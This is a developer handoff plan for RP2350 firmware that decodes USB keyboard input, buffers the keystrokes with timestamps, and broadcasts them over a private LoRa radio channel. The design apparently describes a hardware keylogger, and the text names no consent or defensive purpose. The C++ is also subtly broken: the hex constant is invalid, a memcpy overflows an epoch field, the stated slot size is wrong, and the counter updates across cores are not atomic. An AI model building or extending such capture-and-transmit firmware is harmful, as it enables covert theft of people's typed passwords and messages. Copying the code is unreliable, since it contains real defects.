# Next Session Handoff: Core1 Complete Processing + PSRAM Storage

**Current Branch:** `feature/core1-formatting`
**Status:** Architecture designed, ready to implement
**Priority:** HIGH - Major architectural improvement
**Estimated Time:** 3-4 hours

---

## What Changed from Original Plan

**Original Goal (from previous handoff):**
- Move event formatting from Core0 to Core1
- Small optimization: ~75% reduction in Core0 overhead

**New Goal (Better!):**
- Move **ALL keystroke processing** to Core1
- Core1 writes complete buffers to PSRAM
- Core0 becomes pure transmission layer (just read + transmit)
- Foundation for FRAM storage in future

**Why This is Better:**
- Bigger Core0 reduction: 2% → 0.2% (90% reduction!)
- Cleaner architecture: Producer (Core1) / Consumer (Core0)
- PSRAM provides large buffering (8 slots = 4KB)
- Easy path to FRAM (non-volatile, MB-scale)

---

## Current State

### Completed
✅ Created `formatted_event_queue` for Core1→Core0 event passing
✅ Format function moved to Core1 (keyboard_decoder_core1.cpp)
✅ Core0 reads pre-formatted events
✅ Architecture documented in `PSRAM_BUFFER_ARCHITECTURE.md`

### To Do
- [ ] Create PSRAM buffer manager
- [ ] Move keystroke buffer to Core1
- [ ] Move buffer operations (addToBuffer, addEnterToBuffer, finalizeBuffer) to Core1
- [ ] Update Core0 to poll PSRAM instead of processing queue
- [ ] Test complete flow

---

## Implementation Plan

### Step 1: Create PSRAM Buffer Manager (1 hour)

**New files:**
- `firmware/src/platform/rp2xx0/usb_capture/psram_buffer.h`
- `firmware/src/platform/rp2xx0/usb_capture/psram_buffer.cpp`

**Header Structure:**
```cpp
// psram_buffer.h

#ifndef PSRAM_BUFFER_H
#define PSRAM_BUFFER_H

#include <stdint.h>
#include <stdbool.h>

#define PSRAM_BUFFER_SLOTS 8
#define PSRAM_BUFFER_DATA_SIZE 504
#define PSRAM_MAGIC 0xC0DEBUF1

// Buffer header (32 bytes, shared between cores)
typedef struct {
    uint32_t magic;              // Validation
    volatile uint32_t write_index;     // Core1 writes (0-7)
    volatile uint32_t read_index;      // Core0 reads (0-7)
    volatile uint32_t buffer_count;    // Available for transmission
    uint32_t total_written;      // Statistics
    uint32_t total_transmitted;
    uint32_t dropped_buffers;
    uint32_t reserved;
} psram_buffer_header_t;

// Individual buffer slot (512 bytes)
typedef struct {
    uint32_t start_epoch;
    uint32_t final_epoch;
    uint16_t data_length;
    uint16_t flags;
    char data[PSRAM_BUFFER_DATA_SIZE];
} psram_keystroke_buffer_t;

// Complete PSRAM structure
typedef struct {
    psram_buffer_header_t header;
    psram_keystroke_buffer_t slots[PSRAM_BUFFER_SLOTS];
} psram_buffer_t;

// Global instance (in RAM for now, FRAM later)
extern psram_buffer_t g_psram_buffer;

// Core1 functions (write)
void psram_buffer_init();
bool psram_buffer_write(const psram_keystroke_buffer_t *buffer);

// Core0 functions (read)
bool psram_buffer_has_data();
bool psram_buffer_read(psram_keystroke_buffer_t *buffer);
uint32_t psram_buffer_get_count();

#endif
```

**Implementation:**
```cpp
// psram_buffer.cpp

#include "psram_buffer.h"
#include <string.h>

// Global buffer (static allocation for now)
psram_buffer_t g_psram_buffer;

void psram_buffer_init() {
    memset(&g_psram_buffer, 0, sizeof(psram_buffer_t));
    g_psram_buffer.header.magic = PSRAM_MAGIC;
}

bool psram_buffer_write(const psram_keystroke_buffer_t *buffer) {
    // Check if buffer full
    if (g_psram_buffer.header.buffer_count >= PSRAM_BUFFER_SLOTS) {
        g_psram_buffer.header.dropped_buffers++;
        return false;  // Buffer full, Core0 needs to transmit
    }

    // Write to current slot
    uint32_t slot = g_psram_buffer.header.write_index;
    memcpy(&g_psram_buffer.slots[slot], buffer, sizeof(psram_keystroke_buffer_t));

    // Update write index (wrap around)
    g_psram_buffer.header.write_index = (slot + 1) % PSRAM_BUFFER_SLOTS;

    // Increment available count (atomic for Core0)
    g_psram_buffer.header.buffer_count++;
    g_psram_buffer.header.total_written++;

    return true;
}

bool psram_buffer_has_data() {
    return g_psram_buffer.header.buffer_count > 0;
}

bool psram_buffer_read(psram_keystroke_buffer_t *buffer) {
    // Check if data available
    if (g_psram_buffer.header.buffer_count == 0) {
        return false;
    }

    // Read from current slot
    uint32_t slot = g_psram_buffer.header.read_index;
    memcpy(buffer, &g_psram_buffer.slots[slot], sizeof(psram_keystroke_buffer_t));

    // Update read index (wrap around)
    g_psram_buffer.header.read_index = (slot + 1) % PSRAM_BUFFER_SLOTS;

    // Decrement available count
    g_psram_buffer.header.buffer_count--;
    g_psram_buffer.header.total_transmitted++;

    return true;
}

uint32_t psram_buffer_get_count() {
    return g_psram_buffer.header.buffer_count;
}
```

---

### Step 2: Move Keystroke Buffer to Core1 (1 hour)

**In `keyboard_decoder_core1.cpp`:**

```cpp
// Add buffer management to Core1
#define KEYSTROKE_BUFFER_SIZE 500
#define EPOCH_SIZE 10
#define KEYSTROKE_DATA_START EPOCH_SIZE
#define KEYSTROKE_DATA_END (KEYSTROKE_BUFFER_SIZE - EPOCH_SIZE)
#define DELTA_MARKER 0xFF
#define DELTA_SIZE 2
#define DELTA_TOTAL_SIZE 3

// Core1's own keystroke buffer
static char g_core1_keystroke_buffer[KEYSTROKE_BUFFER_SIZE];
static size_t g_core1_buffer_write_pos = KEYSTROKE_DATA_START;
static bool g_core1_buffer_initialized = false;
static uint32_t g_core1_buffer_start_epoch = 0;

// Helper functions (copy from USBCaptureModule.cpp)
static void core1_write_epoch_at(size_t pos);
static void core1_init_keystroke_buffer();
static bool core1_add_to_buffer(char c);
static bool core1_add_enter_to_buffer();
static void core1_finalize_buffer();
```

**Copy these functions from USBCaptureModule.cpp:**
- `writeEpochAt()` → `core1_write_epoch_at()`
- `initKeystrokeBuffer()` → `core1_init_keystroke_buffer()`
- `addToBuffer()` → `core1_add_to_buffer()`
- `addEnterToBuffer()` → `core1_add_enter_to_buffer()`
- `finalizeBuffer()` → `core1_finalize_buffer()`

**Key Changes in `core1_finalize_buffer()`:**
```cpp
static void core1_finalize_buffer() {
    if (!g_core1_buffer_initialized) return;

    // Write final epoch
    core1_write_epoch_at(KEYSTROKE_DATA_END);

    // Create PSRAM buffer
    psram_keystroke_buffer_t psram_buf;

    // Copy epoch timestamps
    memcpy(&psram_buf.start_epoch, &g_core1_keystroke_buffer[0], 10);
    sscanf(&g_core1_keystroke_buffer[0], "%u", &psram_buf.start_epoch);
    sscanf(&g_core1_keystroke_buffer[KEYSTROKE_DATA_END], "%u", &psram_buf.final_epoch);

    // Copy data
    psram_buf.data_length = g_core1_buffer_write_pos - KEYSTROKE_DATA_START;
    memcpy(psram_buf.data, &g_core1_keystroke_buffer[KEYSTROKE_DATA_START], psram_buf.data_length);
    psram_buf.flags = 0;

    // Write to PSRAM
    if (!psram_buffer_write(&psram_buf)) {
        // Buffer full - Core0 slow to transmit
        // Could log error via formatted_event_queue
    }

    // Reset for next buffer
    g_core1_buffer_initialized = false;
    g_core1_buffer_write_pos = KEYSTROKE_DATA_START;
}
```

**Update keystroke processing:**
```cpp
// In keyboard_decoder_core1_process_report()
// After creating keystroke event:

switch (event.type) {
case KEYSTROKE_TYPE_CHAR:
    keystroke_queue_push(g_keystroke_queue, &event);
    format_and_push_event(&event);
    core1_add_to_buffer(event.character);  // NEW!
    break;

case KEYSTROKE_TYPE_ENTER:
    keystroke_queue_push(g_keystroke_queue, &event);
    format_and_push_event(&event);
    core1_add_enter_to_buffer();  // NEW!
    break;

case KEYSTROKE_TYPE_TAB:
    keystroke_queue_push(g_keystroke_queue, &event);
    format_and_push_event(&event);
    core1_add_to_buffer('\t');  // NEW!
    break;

case KEYSTROKE_TYPE_BACKSPACE:
    keystroke_queue_push(g_keystroke_queue, &event);
    format_and_push_event(&event);
    core1_add_to_buffer('\b');  // NEW!
    break;
}
```

---

### Step 3: Update Core0 to Read from PSRAM (30 min)

**In `USBCaptureModule.cpp`:**

Replace `processKeystrokeQueue()` with simpler PSRAM polling:

```cpp
int32_t USBCaptureModule::runOnce() {
    // Still launch Core1 on first run (same as before)
    if (!core1_started) {
        // ... Core1 launch code unchanged ...
    }

    // NEW: Poll PSRAM for completed buffers
    processPSRAMBuffers();

    // Still process formatted events for logging
    processFormattedEvents();

    return 100;  // Poll every 100ms
}

void USBCaptureModule::processPSRAMBuffers() {
    psram_keystroke_buffer_t buffer;

    // Process all available buffers
    while (psram_buffer_read(&buffer)) {
        LOG_INFO("[Core0] Transmitting buffer: %u bytes (epoch %u → %u)",
                buffer.data_length, buffer.start_epoch, buffer.final_epoch);

        // Transmit directly (data already formatted by Core1!)
        broadcastToPrivateChannel((const uint8_t *)buffer.data, buffer.data_length);
    }

    // Log statistics periodically
    static uint32_t last_stats_time = 0;
    uint32_t now = millis();
    if (now - last_stats_time > 10000) {
        LOG_INFO("[Core0] PSRAM buffers: %u available, %u total transmitted, %u dropped",
                psram_buffer_get_count(),
                g_psram_buffer.header.total_transmitted,
                g_psram_buffer.header.dropped_buffers);
        last_stats_time = now;
    }
}

void USBCaptureModule::processFormattedEvents() {
    // Keep this for logging (already implemented)
    formatted_event_t formatted;
    for (int i = 0; i < 10; i++) {
        if (!formatted_queue_pop(formatted_queue, &formatted)) {
            break;
        }
        LOG_INFO("[Core%u→Core%u] %s", formatted.core_id, get_core_num(), formatted.text);
    }
}
```

**Remove old functions (no longer needed):**
- ❌ `addToBuffer()`
- ❌ `addEnterToBuffer()`
- ❌ `finalizeBuffer()`
- ❌ `initKeystrokeBuffer()`
- ❌ `writeEpochAt()`
- ❌ `keystroke_buffer` member variable

**Keep:**
- ✅ `broadcastToPrivateChannel()` (transmission logic)
- ✅ `processFormattedEvents()` (logging)

---

### Step 4: Update Initialization (15 min)

**In `USBCaptureModule::init()`:**

```cpp
bool USBCaptureModule::init() {
    LOG_INFO("[Core%u] USB Capture Module initializing...", get_core_num());

    // Initialize queues
    keystroke_queue_init(keystroke_queue);
    formatted_queue_init(formatted_queue);

    // NEW: Initialize PSRAM buffer
    psram_buffer_init();

    // Initialize capture controller
    capture_controller_init_v2(&controller, keystroke_queue, formatted_queue);

    // Set capture speed
    capture_controller_set_speed_v2(&controller, CAPTURE_SPEED_LOW);

    LOG_INFO("USB Capture Module initialized");
    return true;
}
```

**In `usb_capture_main.cpp` (Core1 init):**

```cpp
// Add PSRAM header include
#include "psram_buffer.h"

void capture_controller_core1_main_v2(void) {
    // ... existing startup code ...

    // NEW: Initialize Core1 buffer
    g_core1_buffer_write_pos = KEYSTROKE_DATA_START;
    g_core1_buffer_initialized = false;

    // ... rest of Core1 main loop ...
}
```

---

## File Changes Summary

**New Files:**
- `psram_buffer.h` (~80 lines)
- `psram_buffer.cpp` (~100 lines)

**Modified Files:**
- `keyboard_decoder_core1.cpp` - Add buffer management (+200 lines)
- `USBCaptureModule.cpp` - Simplify to PSRAM polling (-300 lines, +50 lines)
- `USBCaptureModule.h` - Remove buffer members (-10 lines)
- `usb_capture_main.cpp` - Add PSRAM init (+5 lines)

**Net Change:** ~+125 lines (cleaner architecture, better separation)

---

## Testing Plan

**Test 1: Verify Core1 Buffer Management**
```
Expected: Core1 logs show buffer operations
[Core1] Buffer initialized
[Core1] Added char 'h' to buffer
[Core1] Buffer finalized, written to PSRAM slot 0
```

**Test 2: Verify PSRAM Ring Buffer**
```
Expected: Buffers cycle through 8 slots correctly
Slot 0 → Slot 1 → ... → Slot 7 → Slot 0 (wrap)
```

**Test 3: Verify Core0 Transmission**
```
Expected: Core0 reads from PSRAM and transmits
[Core0] Transmitting buffer: 245 bytes (epoch 1733250000 → 1733250099)
[Core0] PSRAM buffers: 2 available, 15 total transmitted, 0 dropped
```

**Test 4: Verify Overflow Handling**
```
Expected: When Core0 slow, buffer fills and drops
[Core1] PSRAM write failed - buffer full (8/8 slots)
[Core0] PSRAM buffers: 8 available, 100 total transmitted, 3 dropped
```

**Test 5: Performance Measurement**
```
Expected: Core0 CPU drops significantly
Before: Core0 ~2% (formatting + buffer management)
After:  Core0 ~0.2% (just PSRAM read + transmit)
Reduction: 90%!
```

---

## Benefits Summary

### Performance
- **90% Core0 overhead reduction** (2% → 0.2%)
- Core1 still has plenty of headroom (<30%)
- Core0 becomes ultra-lightweight

### Architecture
- **Clean separation**: Core1 = Producer, Core0 = Consumer
- Core1 owns all keystroke intelligence
- Core0 is pure transmission layer
- Easy to understand and maintain

### Scalability
- **8-slot buffer** handles transmission delays
- **Easy FRAM migration** (just swap storage backend)
- **Future**: MB-scale non-volatile buffering

---

## Quick Start Commands

```bash
# 1. Ensure on correct branch
git checkout feature/core1-formatting

# 2. Create PSRAM buffer files
touch firmware/src/platform/rp2xx0/usb_capture/psram_buffer.h
touch firmware/src/platform/rp2xx0/usb_capture/psram_buffer.cpp

# 3. Start with psram_buffer.h
# (Copy structure from Step 1 above)

# 4. Implement psram_buffer.cpp
# (Copy implementation from Step 1 above)

# 5. Move buffer functions to Core1
# (Follow Step 2 above)

# 6. Update Core0
# (Follow Step 3 above)

# 7. Build and test
cd firmware
pio run -e xiao-rp2350-sx1262
```

---

## Future: FRAM Migration Path

Once PSRAM implementation works, adding FRAM is trivial:

```cpp
// Abstract storage interface
class KeystrokeStorage {
public:
    virtual bool init() = 0;
    virtual bool write_buffer(const psram_keystroke_buffer_t *) = 0;
    virtual bool read_buffer(psram_keystroke_buffer_t *) = 0;
};

// Current: RAM-based
class RAMStorage : public KeystrokeStorage { ... };

// Future: I2C FRAM
class FRAMStorage : public KeystrokeStorage {
    // I2C communication
    // MB-scale capacity
    // Non-volatile persistence
};
```

**Benefits of FRAM:**
- Non-volatile (survives power loss)
- MB-scale capacity (vs KB for RAM)
- Extreme endurance (10^14 writes)
- Perfect for keystroke logging

---

**Current Commit:** `29ec414` - Handoff updated with PSRAM architecture
**Next Commit:** Create psram_buffer files and start implementation

**Ready to implement when you are!** 🚀

This is a MUCH better architecture than the original plan!
